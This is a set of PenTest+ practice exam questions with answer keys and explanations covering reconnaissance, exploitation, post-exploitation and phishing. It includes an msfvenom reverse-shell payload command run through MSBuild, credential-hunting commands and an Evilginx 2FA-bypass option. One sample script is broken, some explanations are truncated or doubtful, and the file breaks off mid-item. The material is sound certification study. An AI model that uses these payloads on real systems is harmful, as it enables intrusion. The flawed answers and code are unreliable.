[
  {
    "question_number": 36,
    "question_text": "A penetration tester has adversely affected a critical system during an engagement, which could have a material impact on the organization. Which of the following should the penetration tester do to address this issue?",
    "options": {
      "A": "Restore the configuration.",
      "B": "Perform a BIA.",
      "C": "Follow the escalation process.",
      "D": "Select the target."
    },
    "correct_answer": "C",
    "explanation": "If a penetration tester unintentionally disrupts a critical system, they must immediately follow the client’s \nescalation process to ensure proper handling.\n\nFollow the escalation process (Option C):\n\nThe penetration testing engagement follows a predefined incident response and escalation plan.\n\nThe tester documents the issue, informs stakeholders, and works with IT teams to minimize \nimpact.",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 33,
    "question_text": "A tester plans to perform an attack technique over a compromised host. The tester prepares a payload using the following command:\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.12.12.1 LPORT=10112 -f csharp\n\nThe tester then takes the shellcode from the msfvenom command and creates a file called evil.xml. Which of the following commands would most likely be used by the tester to continue with the attack on the host?",
    "options": {
      "A": "regsvr32 /s /n /u C:\\evil.xml",
      "B": "MSBuild.exe C:\\evil.xml",
      "C": "mshta.exe C:\\evil.xml",
      "D": "AppInstaller.exe C:\\evil.xml"
    },
    "correct_answer": "B",
    "explanation": "The provided msfvenom command creates a payload in C# format. To continue the attack using the generated \nshellcode in evil.xml, the most appropriate execution method involves MSBuild.exe, which can process XML \nfiles containing C# code:\n\nUnderstanding MSBuild.exe:\n\nPurpose: MSBuild is a build tool that processes project files written in XML and can execute \ntasks defined in the XML. It’s commonly used to build .NET applications and can also execute \ncode embedded in project files.\n\nCommand Usage:\n\nCommand: MSBuild.exe C:\\evil.xml\n\nExplanation: This command tells MSBuild to process the evil.xml file, which contains the C# \nshellcode. MSBuild will compile and execute the code, leading to the payload execution.\n\nComparison with Other Commands:\n\nregsvr32 /s /n /u C:\\evil.xml: Used to register or unregister DLLs, not suitable for executing C# \ncode.\n\nmshta.exe C:\\evil.xml: Used to execute HTML applications (HTA files), not suitable for XML \ncontaining C# code.\n\nAppInstaller.exe C:\\evil.xml: Used to install AppX packages, not relevant for executing C# code \nembedded in an XML file.\n\nUsing MSBuild.exe is the most appropriate method to execute the payload embedded in the XML file created \nby msfvenom.\n=================",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 1,
    "question_text": "During an engagement, a penetration tester wants to enumerate users from Linux systems by using finger and rwho commands. However, the tester realizes these commands alone will not achieve the desired result. Which of the following is the best tool to use for this task?",
    "options": {
      "A": "Nikto",
      "B": "Burp Suite",
      "C": "smbclient",
      "D": "theHarvester"
    },
    "correct_answer": "C",
    "explanation": "The smbclient tool is used to access SMB/CIFS resources on a network. It allows penetration testers to \nconnect to shared resources and enumerate users on a network, particularly in Windows environments. While \nfinger and rwho are more common on Unix/Linux systems, smbclient provides better functionality for \nenumerating users across a network.\n\nUnderstanding smbclient:\n\nPurpose: smbclient is used to access and manage files and directories on SMB/CIFS servers.\n\nCapabilities: It allows for browsing shared resources, listing directories, downloading and \nuploading files, and enumerating users.\n\nUser Enumeration:\n\nCommand: Use smbclient with the -L option to list available shares and users.\n\nStep-by-Step Explanationsmbclient -L //target_ip -U username\n\nExample: Enumerating users on a target system.\n\nsmbclient -L //192.168.50.2 -U anonymous\n\nAdvantages:\n\nComprehensive: Provides detailed information about shared resources and users.\n\nCross-Platform: Can be used on both Linux and Windows systems.\n\nReferences from Pentesting Literature:\n\nSMB enumeration is a common practice discussed in penetration testing guides for identifying \nshared resources and users in a network environment.\n\nHTB write-ups frequently mention the use of smbclient for enumerating network shares and users.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 196,
    "question_text": "A penetration tester wants to send a specific network packet with custom flags and sequence numbers to a vulnerable target. Which of the following should the tester use?",
    "options": {
      "A": "tcprelay",
      "B": "Bluecrack",
      "C": "Scapy",
      "D": "tcpdump"
    },
    "correct_answer": "C",
    "explanation": "Scapy is a powerful interactive Python-based packet manipulation tool used by penetration testers to create, \nmodify, send, and analyze custom packets. It supports many protocols and allows you to set TCP flags, \nsequence numbers, and more.\n\ntcprelay is used to redirect TCP traffic, not to craft packets.\n\nBluecrack is used for cracking Bluetooth encryption, irrelevant in this context.\n\ntcpdump is a packet capture tool, not suitable for crafting or injecting packets.",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 155,
    "question_text": "In a file stored in an unprotected source code repository, a penetration tester discovers the following line of code:\n\nsshpass -p donotchange ssh admin@192.168.6.14\n\nWhich of the following should the tester attempt to do next to take advantage of this information? (Select two).",
    "options": {
      "A": "Use Nmap to identify all the SSH systems active on the network.",
      "B": "Take a screen capture of the source code repository for documentation purposes.",
      "C": "Investigate to find whether other files containing embedded passwords are in the code repository.",
      "D": "Confirm whether the server 192.168.6.14 is up by sending ICMP probes.",
      "E": "Run a password-spraying attack with Hydra against all the SSH servers.",
      "F": "Use an external exploit through Metasploit to compromise host 192.168.6.14."
    },
    "correct_answer": "B C",
    "explanation": "When a penetration tester discovers hard-coded credentials in a file within an unprotected source code \nrepository, the next steps should focus on documentation and further investigation to identify additional \nsecurity issues.\n\nTaking a Screen Capture (Option B):\n\nDocumentation: It is essential to document the finding for the final report. A screen capture \nprovides concrete evidence of the discovered hard-coded credentials.\n\nAudit Trail: This ensures that there is a record of the vulnerability and can be used to \ncommunicate the issue to stakeholders, such as the development team or the client.\n\nInvestigating for Other Embedded Passwords (Option C):\n\nThorough Search: Finding one hard-coded password suggests there might be others. A thorough \ninvestigation can reveal additional credentials, which could further compromise the security of \nthe system.\n\nAutomation Tools: Tools like truffleHog, git-secrets, and grep can be used to scan the repository \nfor other instances of hard-coded secrets.\n\nPentest References:\n\nInitial Discovery: Discovering hard-coded credentials often occurs during source code review or \nautomated scanning of repositories.\n\nDocumentation: Keeping detailed records of all findings is a critical part of the penetration testing \nprocess. This ensures that all discovered vulnerabilities are reported accurately and comprehensively.\n\nFurther Investigation: After finding a hard-coded credential, it is best practice to look for other security \nissues within the same repository. This might include other credentials, API keys, or sensitive \ninformation.\n\nSteps to Perform:\n\nTake a Screen Capture:\n\nUse a screenshot tool to capture the evidence of the hard-coded credentials. Ensure the capture \nincludes the context, such as the file path and relevant code lines.\n\nInvestigate Further:\n\nUse tools and manual inspection to search for other embedded passwords.\n\nCommands such as grep can be helpful:\n\ngrep -r 'password' /path/to/repository\n\nTools like truffleHog can search for high entropy strings indicative of secrets:\n\ntrufflehog --regex --entropy=True /path/to/repository\n\nBy documenting the finding and investigating further, the penetration tester ensures a comprehensive \nassessment of the repository, identifying and mitigating potential security risks effectively.\n=================",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_multiple_answer"
  },
  {
    "question_number": 90,
    "question_text": "An external legal firm is conducting a penetration test of a large corporation. Which of the following would be most appropriate for the legal firm to use in the subject line of a weekly email update?",
    "options": {
      "A": "Privileged & Confidential Status Update",
      "B": "Action Required Status Update",
      "C": "Important Weekly Status Update",
      "D": "Urgent Status Update"
    },
    "correct_answer": "A",
    "explanation": "Penetration test results are sensitive information and must be handled confidentially.\n\nPrivileged & Confidential Status Update (Option A):\n\nHelps ensure compliance with legal and regulatory standards by labeling the report as \nconfidential.\n\nEncourages secure handling by recipients.",
    "is_simulation": false,
    "domain": "1.0 Engagement Management",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 167,
    "question_text": "Which of the following can an access control vestibule help deter?",
    "options": {
      "A": "USB drops",
      "B": "Badge cloning",
      "C": "Lock picking",
      "D": "Tailgating"
    },
    "correct_answer": "D",
    "explanation": "Un access control vestibule (también conocido como mantrap) es una estructura de seguridad que permite \nque solo una persona entre a la vez a través de dos puertas controladas. Este tipo de estructura está diseñada \nespecíficamente para evitar tailgating, donde una persona no autorizada intenta entrar siguiendo a una \nautorizada.\n\nNo previene ataques como la clonación de credenciales (badge cloning), ni el uso de USB maliciosos, ni \ntécnicas de lock picking.\n\nReferencia: PT0-003 Objective 2.1 – Physical security controls, including mantraps and their use against \ntailgating.",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 19,
    "question_text": "A penetration tester is evaluating a SCADA system. The tester receives local access to a workstation that is running a single application. While navigating through the application, the tester opens a terminal window and gains access to the underlying operating system. Which of the following attacks is the tester performing?",
    "options": {
      "A": "Kiosk escape",
      "B": "Arbitrary code execution",
      "C": "Process hollowing",
      "D": "Library injection"
    },
    "correct_answer": "A",
    "explanation": "A kiosk escape involves breaking out of a restricted environment, such as a kiosk or a single application \ninterface, to access the underlying operating system. Here’s why option A is correct:\n\nKiosk Escape: This attack targets environments where user access is intentionally limited, such as a \nkiosk or a dedicated application. The goal is to break out of these restrictions and gain access to the full \noperating system.\n\nArbitrary Code Execution: This involves running unauthorized code on the system, but the scenario \ndescribed is more about escaping a restricted environment.\n\nProcess Hollowing: This technique involves injecting code into a legitimate process, making it appear \nbenign while executing malicious activities.\n\nLibrary Injection: This involves injecting malicious code into a running process by loading a malicious \nlibrary, which is not the focus in this scenario.\n\nReferences from Pentest:\n\nForge HTB: Demonstrates techniques to escape restricted environments and gain broader access to the \nsystem.\n\nHorizontall HTB: Shows methods to break out of limited access environments, aligning with the \nconcept of kiosk escape.\n\nConclusion:\n\nOption A, Kiosk escape, accurately describes the type of attack where a tester breaks out of a restricted \nenvironment to access the underlying operating system.\n=================",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 42,
    "question_text": "A penetration tester is researching a path to escalate privileges. While enumerating current user privileges, the tester observes the following:\n\nSeAssignPrimaryTokenPrivilege Disabled\nSeIncreaseQuotaPrivilege Disabled\nSeChangeNotifyPrivilege Enabled\nSeManageVolumePrivilege Enabled\nSeImpersonatePrivilege Enabled\nSeCreateGlobalPrivilege Enabled\nSeIncreaseWorkingSetPrivilege Disabled\n\nWhich of the following privileges should the tester use to achieve the goal?",
    "options": {
      "A": "SeImpersonatePrivilege",
      "B": "SeCreateGlobalPrivilege",
      "C": "SeChangeNotifyPrivilege",
      "D": "SeManageVolumePrivilege"
    },
    "correct_answer": "A",
    "explanation": "The SeImpersonatePrivilege allows a process to impersonate another user’s security context, which is \ncommonly used in token manipulation attacks for privilege escalation.\n\nOption A (SeImpersonatePrivilege) #: Correct.\n\nUsed in Juicy Potato or Rogue Potato attacks to escalate privileges.\n\nOption B (SeCreateGlobalPrivilege) #: Allows creating global objects, but not privilege escalation.\n\nOption C (SeChangeNotifyPrivilege) #: Enables traverse directory access, not privilege escalation.\n\nOption D (SeManageVolumePrivilege) #: Used for disk management, not privilege escalation.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Windows Privilege Escalation via Token \nImpersonation",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 11,
    "question_text": "Which of the following protocols would a penetration tester most likely utilize to exfiltrate data covertly and evade detection?",
    "options": {
      "A": "FTP",
      "B": "HTTPS",
      "C": "SMTP",
      "D": "DNS"
    },
    "correct_answer": "D",
    "explanation": "Covert data exfiltration is a crucial aspect of advanced penetration testing. Penetration testers often need to \nmove data out of a network without being detected by the organization's security monitoring tools. Here's a \nbreakdown of the potential methods and why DNS is the preferred choice for covert data exfiltration:\n\nFTP (File Transfer Protocol) (Option A):\n\nCharacteristics: FTP is a clear-text protocol used to transfer files.\n\nDrawbacks: It is easily detected by network security tools due to its lack of encryption and \ndistinctive traffic patterns. Most modern networks block or heavily monitor FTP traffic to prevent \nunauthorized file transfers.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 124,
    "question_text": "A penetration tester finished a security scan and uncovered numerous vulnerabilities on several hosts. Based on the targets' EPSS and CVSS scores, which of the following targets is the most likely to get attacked?\n\nHost | CVSS | EPSS\nTarget 1 | 4 | 0.6\nTarget 2 | 2 | 0.3\nTarget 3 | 1 | 0.6\nTarget 4 | 4.5 | 0.4",
    "options": {
      "A": "Target 1: CVSS Score = 4 and EPSS Score = 0.6",
      "B": "Target 2: CVSS Score = 2 and EPSS Score = 0.3",
      "C": "Target 3: CVSS Score = 1 and EPSS Score = 0.6",
      "D": "Target 4: CVSS Score = 4.5 and EPSS Score = 0.4"
    },
    "correct_answer": "A",
    "explanation": "Based on the CVSS (Common Vulnerability Scoring System) and EPSS (Exploit Prediction Scoring System) \nscores, Target 1 is the most likely to get attacked.\n\nCVSS:\n\nDefinition: CVSS provides a numerical score to represent the severity of a vulnerability, helping \nto prioritize the response based on the potential impact.\n\nScore Range: Scores range from 0 to 10, with higher scores indicating more severe vulnerabilities.\n\nEPSS:\n\nDefinition: EPSS estimates the likelihood that a vulnerability will be exploited in the wild within \nthe next 30 days.\n\nScore Range: EPSS scores range from 0 to 1, with higher scores indicating a higher likelihood of \nexploitation.\n\nAnalysis:\n\nTarget 1: CVSS = 4, EPSS = 0.6\n\nTarget 2: CVSS = 2, EPSS = 0.3\n\nTarget 3: CVSS = 1, EPSS = 0.6\n\nTarget 4: CVSS = 4.5, EPSS = 0.4\n\nTarget 1 has a moderate CVSS score and a high EPSS score, indicating it has a significant \nvulnerability that is quite likely to be exploited.\n\nPentest References:\n\nVulnerability Prioritization: Using CVSS and EPSS scores to prioritize vulnerabilities based on severity \nand likelihood of exploitation.\n\nRisk Assessment: Understanding the balance between impact (CVSS) and exploit likelihood (EPSS) to \nidentify the most critical targets for remediation or attack.\n\nBy focusing on Target 1, which has a balanced combination of severity and exploitability, the penetration \ntester can address the most likely target for attacks based on the given scores.\n=================",
    "is_simulation": false,
    "domain": "3.0 Vulnerability Discovery and Analysis",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 50,
    "question_text": "You are a penetration tester running port scans on a server.\nINSTRUCTIONS\nPart 1: Given the output, construct the command that was used to generate this output from the available options.\nPart 2: Once the command is appropriately constructed, use the given output to identify the potential attack vectors that should be investigated further.\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.",
    "options": null,
    "correct_answer": null,
    "explanation": "Part 1 - 192.168.2.2 -O -sV --top-ports=100 and SMB vulns\nPart 2 - Weak SMB file permissions\nhttps://subscription.packtpub.com/book/networking-and-servers/9781786467454/1/ch01lvl1sec13\n/fingerprinting-os-and-services-running-on-a-target-host",
    "is_simulation": true,
    "simulation_details": "Given NMAP Scan Output, Part 1: Construct the command using drag and drop options. Part 2: Identify potential attack vectors using checkboxes.",
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "simulation"
  },
  {
    "question_number": 213,
    "question_text": "Which of the following techniques is the best way to avoid detection by data loss prevention tools?",
    "options": {
      "A": "Encoding",
      "B": "Compression",
      "C": "Encryption",
      "D": "Obfuscation"
    },
    "correct_answer": "A",
    "explanation": "Encoding to Evade DLP:\n\nEncoding (e.g., Base64) transforms data into a format that may bypass data loss prevention \n(DLP) tools.\n\nDLP solutions often look for specific patterns (e.g., sensitive keywords, file headers) and may not \nrecognize encoded data.\n\nWhy Not Other Options?\n\nB (Compression): Compression reduces file size but does not typically bypass DLP detection \nmechanisms.\n\nC (Encryption): Encrypted data is detectable by DLP tools, though its contents may not be \nreadable.\n\nD (Obfuscation): While obfuscation hides intent, encoding is more effective for bypassing \nautomated detection.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 161,
    "question_text": "A penetration tester conducts reconnaissance for a client's network and identifies the following system of interest:\n\n$ nmap -A AppServer1.compita.org\nStarting Nmap 7.80 (2023-01-14) on localhost (127.0.0.1) at 2023-08-04 15:32:27\nNmap scan report for AppServer1.compita.org (192.168.1.100)\nHost is up (0.001s latency).\nNot shown: 999 closed ports\nPort State Service\n21/tcp open ftp\n22/tcp open ssh\n23/tcp open telnet\n80/tcp open http\n135/tcp open msrpc\n139/tcp open netbios-ssn\n443/tcp open https\n445/tcp open microsoft-ds\n873/tcp open rsync\n8080/tcp open http-proxy\n8443/tcp open https-alt\n9090/tcp open zeus-admin\n10000/tcp open snet-sensor-mgmt\n\nThe tester notices numerous open ports on the system of interest. Which of the following best describes this system?",
    "options": {
      "A": "A honeypot",
      "B": "A Windows endpoint",
      "C": "A Linux server",
      "D": "An already-compromised system"
    },
    "correct_answer": "A",
    "explanation": "A honeypot is a decoy system designed to attract attackers by exposing multiple services and vulnerabilities.\n\nIndicators of a honeypot (Option A):\n\nThe system has an unusual combination of Windows (SMB, MSRPC) and Linux (Rsync, SSH) \nservices.\n\nIt exposes a large number of open ports, which is uncommon for a production server.\n\nPresence of \"zeus-admin\" (port 9090) suggests intentionally vulnerable services.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 83,
    "question_text": "SIMULATION\nUsing the output, identify potential attack vectors that should be further investigated.",
    "options": null,
    "correct_answer": null,
    "explanation": "1: Null session enumeration\nWeak SMB file permissions\nFragmentation attack\n2: nmap\n-sV\n-p 1-1023\n192.168.2.2\n3: #!/usr/bin/python\nexport $PORTS = 21,22\nfor $PORT in $PORTS:\ntry:\ns.connect((ip, port))\nprint(“%s:%s – OPEN” % (ip, port))\nexcept socket.timeout\nprint(“%:%s – TIMEOUT” % (ip, port))\nexcept socket.error as e:\nprint(“%:%s – CLOSED” % (ip, port))\nfinally\ns.close()\nport_scan(sys.argv[1], ports)",
    "is_simulation": true,
    "simulation_details": "Based on provided Nmap output and other visual elements (like code snippets), identify attack vectors or complete code. The provided explanation seems to detail steps for a simulation involving code completion and vector identification based on prior Nmap/enum4linux output.",
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "simulation"
  },
  {
    "question_number": 199,
    "question_text": "A penetration tester gains access to a Windows machine and wants to further enumerate users with native operating system credentials. Which of the following should the tester use?",
    "options": {
      "A": "route",
      "B": "nbtstat",
      "C": "net",
      "D": "whoami"
    },
    "correct_answer": "C",
    "explanation": "Windows provides built-in utilities for user enumeration and privilege escalation.\n\nnet command (Option C):\n\nThe net command is used to list users, groups, and shares on a Windows system:\n\nnet user\nnet localgroup administrators\nnet group \"Domain Admins\" /domain\n\nUseful for gathering privilege escalation targets and understanding user permissions.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 15,
    "question_text": "A penetration tester runs a network scan but has some issues accurately enumerating the vulnerabilities due to the following error:\n\nOS identification failed\n\nWhich of the following is most likely causing this error?",
    "options": {
      "A": "The scan did not reach the target because of a firewall block rule.",
      "B": "The scanner database is out of date.",
      "C": "The scan is reporting a false positive.",
      "D": "The scan cannot gather one or more fingerprints from the target."
    },
    "correct_answer": "D",
    "explanation": "OS identification in tools like Nmap relies on fingerprinting techniques, which analyze response \ncharacteristics (e.g., TCP/IP stack behavior).\n\nThe scan cannot gather one or more fingerprints from the target (Option D):\n\nIf the system is configured to block ICMP responses, or if certain ports are closed, fingerprinting \nfails.\n\nSome modern firewalls and intrusion prevention systems (IPS) interfere with OS fingerprinting \nby modifying packet responses.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 58,
    "question_text": "A penetration tester sets up a C2 (Command and Control) server to manage and control payloads deployed in the target network. Which of the following tools is the most suitable for establishing a robust and stealthy connection?",
    "options": {
      "A": "ProxyChains",
      "B": "Covenant",
      "C": "PsExec",
      "D": "sshuttle"
    },
    "correct_answer": "B",
    "explanation": "C2 servers are used to remotely control compromised systems while avoiding detection.\n\nCovenant (Option B):\n\nCovenant is an advanced C2 framework designed for stealthy post-exploitation in red team \noperations.\n\nSupports encrypted communication, privilege escalation, and evasion techniques.",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 227,
    "question_text": "During an assessment, a penetration tester obtains a low-privilege shell and then runs the following command:\n\nfindstr /SIM /C:\"pass\" *.txt *.cfg *.xml\n\nWhich of the following is the penetration tester trying to enumerate?",
    "options": {
      "A": "Configuration files",
      "B": "Permissions",
      "C": "Virtual hosts",
      "D": "Secrets"
    },
    "correct_answer": "D",
    "explanation": "By running the command findstr /SIM /C:\"pass\" *.txt *.cfg *.xml, the penetration tester is trying to enumerate \nsecrets.\n\nCommand Analysis:\n\nfindstr: A command-line utility in Windows used to search for specific strings in files.\n\n/SIM: Combination of options; /S searches for matching files in the current directory and all \nsubdirectories, /I specifies a case-insensitive search, and /M prints only the filenames with \nmatching content.\n\n/C:\"pass\": Searches for the literal string \"pass\".\n\n***.txt .cfg .xml: Specifies the file types to search within.\n\nObjective:\n\nThe command is searching for the string \"pass\" within .txt, .cfg, and .xml files, which is \nindicative of searching for passwords or other sensitive information (secrets).\n\nThese file types commonly contain configuration details, credentials, and other sensitive data that \nmight include passwords or secrets.\n\nOther Options:\n\nConfiguration files: While .cfg and .xml files can be configuration files, the specific search for \n\"pass\" indicates looking for secrets like passwords.\n\nPermissions: This command does not check or enumerate file permissions.\n\nVirtual hosts: This command is not related to enumerating virtual hosts.\n\nPentest References:\n\nPost-Exploitation: Enumerating sensitive information like passwords is a common post-exploitation \nactivity after gaining initial access.\n\nCredential Discovery: Searching for stored credentials within configuration files and documents to \nescalate privileges or move laterally within the network.\n\nBy running this command, the penetration tester aims to find stored passwords or other secrets that could help \nin further exploitation of the target system.\n=================",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 30,
    "question_text": "A penetration tester performs a service enumeration process and receives the following result after scanning a server using the Nmap tool:\n\nPORT STATE SERVICE\n22/tcp open ssh\n25/tcp filtered smtp\n111/tcp open rpcbind\n2049/tcp open nfs\n\nBased on the output, which of the following services provides the best target for launching an attack?",
    "options": {
      "A": "Database",
      "B": "Remote access",
      "C": "Email",
      "D": "File sharing"
    },
    "correct_answer": "D",
    "explanation": "Based on the Nmap scan results, the services identified on the target server are as follows:\n\n22/tcp open ssh:\n\nService: SSH (Secure Shell)\n\nFunction: Provides encrypted remote access.\n\nAttack Surface: Brute force attacks or exploiting vulnerabilities in outdated SSH \nimplementations. However, it is generally considered secure if properly configured.\n\n25/tcp filtered smtp:\n\nService: SMTP (Simple Mail Transfer Protocol)\n\nFunction: Email transmission.\n\nAttack Surface: Potential for email-related attacks such as spoofing, but the port is filtered, \nindicating that access may be restricted or protected by a firewall.\n\n111/tcp open rpcbind:\n\nService: RPCBind (Remote Procedure Call Bind)\n\nFunction: Helps in mapping RPC program numbers to network addresses.\n\nAttack Surface: Can be exploited in specific configurations, but generally not a primary target \ncompared to others.\n\n2049/tcp open nfs:\n\nService: NFS (Network File System)\n\nFunction: Allows for file sharing over a network.\n\nAttack Surface: NFS can be a significant target for attacks due to potential misconfigurations that \ncan allow unauthorized access to file shares or exploitation of vulnerabilities in NFS services.\n\nConclusion: The NFS service (2049/tcp) provides the best target for launching an attack. File sharing services \nlike NFS often contain sensitive data and can be vulnerable to misconfigurations that allow unauthorized \naccess or privilege escalation.",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 149,
    "question_text": "A penetration tester is conducting reconnaissance for an upcoming assessment of a large corporate client. The client authorized spear phishing in the rules of engagement. Which of the following should the tester do first when developing the phishing campaign?",
    "options": {
      "A": "Shoulder surfing",
      "B": "Recon-ng",
      "C": "Social media",
      "D": "Password dumps"
    },
    "correct_answer": "C",
    "explanation": "When developing a phishing campaign, the tester should first use social media to gather information about the \ntargets.\n\nSocial Media:\n\nPurpose: Social media platforms like LinkedIn, Facebook, and Twitter provide valuable \ninformation about individuals, including their job roles, contact details, interests, and connections.\n\nReconnaissance: This information helps craft convincing and targeted phishing emails, increasing \nthe likelihood of success.\n\nProcess:\n\nGathering Information: Collect details about the target employees, such as their names, job titles, \nemail addresses, and any personal information that can make the phishing email more credible.\n\nCrafting Phishing Emails: Use the gathered information to personalize phishing emails, making \nthem appear legitimate and relevant to the recipients.\n\nOther Options:\n\nShoulder Surfing: Observing someone’s screen or keyboard input to gain information, not \nsuitable for gathering broad information for a phishing campaign.\n\nRecon-ng: A tool for automated reconnaissance, useful but more general. Social media is \nspecifically targeted for gathering personal information.\n\nPassword Dumps: Using previously leaked passwords to find potential targets is more invasive \nand less relevant to the initial stage of developing a phishing campaign.\n\nPentest References:\n\nSpear Phishing: A targeted phishing attack aimed at specific individuals, using personal information to \nincrease the credibility of the email.\n\nOSINT (Open Source Intelligence): Leveraging publicly available information to gather intelligence on \ntargets, including through social media.\n\nBy starting with social media, the penetration tester can collect detailed and personalized information about \nthe targets, which is essential for creating an effective spear phishing campaign.\n=================",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 198,
    "question_text": "During a security assessment, a penetration tester uses a tool to capture plaintext log-in credentials on the communication between a user and an authentication system. The tester wants to use this information for further unauthorized access. Which of the following tools is the tester using?",
    "options": {
      "A": "Burp Suite",
      "B": "Wireshark",
      "C": "Zed Attack Proxy",
      "D": "Metasploit"
    },
    "correct_answer": "B",
    "explanation": "Wireshark is a network packet analyzer used to capture and analyze network traffic in real-time. During a \npenetration test, it is often used to inspect unencrypted communication to extract sensitive information like \nplaintext login credentials. Here's how it works:\n\nPacket Capturing:Wireshark captures the network packets transmitted over a network interface. If a user \nlogs in through an insecure communication protocol (e.g., HTTP, FTP, or Telnet), the credentials are \ntransmitted in plaintext.\n\nTraffic Filtering:Using filters (e.g., http, tcp.port == 21), the tester narrows down the relevant traffic to \nlocate the login request and response packets.\n\nSensitive Data Extraction:Analyzing the captured packets reveals plaintext credentials in the data \npayload, such as in HTTP POST requests.\n\nExploit the Information:After extracting the plaintext credentials, the tester can attempt unauthorized \naccess to resources using these credentials.\n\nCompTIA Pentest+ References:\n\nDomain 1.0 (Planning and Scoping)\n\nDomain 2.0 (Information Gathering and Vulnerability Identification)\n\nWireshark Usage Guide",
    "is_simulation": false,
    "domain": "2.0 Reconnaissance and Enumeration",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 87,
    "question_text": "A company hires a penetration tester to test the security of its wireless networks. The main goal is to intercept and access sensitive data.\nWhich of the following tools should the security professional use to best accomplish this task?",
    "options": {
      "A": "Metasploit",
      "B": "WiFi-Pumpkin",
      "C": "SET",
      "D": "theHarvester",
      "E": "WiGLE.net"
    },
    "correct_answer": "B",
    "explanation": "WiFi-Pumpkin is used for man-in-the-middle (MitM) attacks on Wi-Fi networks, making it ideal for \nintercepting and accessing data.\n\nOption A (Metasploit) #: Good for exploitation, but not specialized for Wi-Fi attacks.\n\nOption B (WiFi-Pumpkin) #: Correct.\n\nCreates fake Wi-Fi access points.\n\nIntercepts network traffic (SSL stripping, DNS spoofing).\n\nOption C (SET - Social Engineering Toolkit) #: Focuses on phishing, not Wi-Fi attacks.\n\nOption D (theHarvester) #: Used for OSINT, not Wi-Fi exploitation.\n\nOption E (WiGLE.net) #: Maps Wi-Fi networks, but does not capture sensitive data.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Wireless Attacks & Fake APs",
    "is_simulation": false,
    "domain": "4.0 Attacks and Exploits",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 39,
    "question_text": "A penetration tester needs to complete cleanup activities from the testing lead. Which of the following should the tester do to validate that reverse shell payloads are no longer running?",
    "options": {
      "A": "Run scripts to terminate the implant on affected hosts.",
      "B": "Spin down the C2 listeners.",
      "C": "Restore the firewall settings of the original affected hosts.",
      "D": "Exit from C2 listener active sessions."
    },
    "correct_answer": "A",
    "explanation": "To ensure that reverse shell payloads are no longer running, it is essential to actively terminate any implanted \nmalware or scripts. Here’s why option A is correct:\n\nRun Scripts to Terminate the Implant: This ensures that any reverse shell payloads or malicious \nimplants are actively terminated on the affected hosts. It is a direct and effective method to clean up \nafter a penetration test.\n\nSpin Down the C2 Listeners: This stops the command and control listeners but does not remove the \nimplants from the hosts.\n\nRestore the Firewall Settings: This is important for network security but does not directly address the \ntermination of active implants.\n\nExit from C2 Listener Active Sessions: This closes the current sessions but does not ensure that \nimplants are terminated.\n\nReferences from Pentest:\n\nAnubis HTB: Demonstrates the process of cleaning up and ensuring that all implants are removed after \nan assessment.\n\nForge HTB: Highlights the importance of thoroughly cleaning up and terminating any payloads or \nimplants to leave the environment secure post-assessment.\n=================",
    "is_simulation": false,
    "domain": "5.0 Post-exploitation and Lateral Movement",
    "question_type": "multiple_choice_single_answer"
  },
  {
    "question_number": 212,
    "question_text": "A tester is performing an external phishing assessment on the top executives at a company. Two-factor authentication is enabled on the executives’ accounts that are in the scope of work. Which of the following should the tester do to get access to these accounts?",
    "options": {
      "A": "Configure an external domain using a typosquatting technique. Configure Evilginx to bypass two-factor authentication using a phishlet that simulates the mail portal for the company.",
      "B": "Configure Gophish to use an external domain. Clone the email portal web page from the company and get the two-factor authentication code using a brute-force attack method.",
      "C": "Configure an external domain using a typosquatting technique. Configure SET to bypass two-factor authentication using a phishlet that mimics the mail portal for the company.",
      "D": "Configure Gophish to use an external domain. Clone the email portal web page from the company and get the two-factor authentication code using a vishing method."
    },
    "correct_answer": "A",
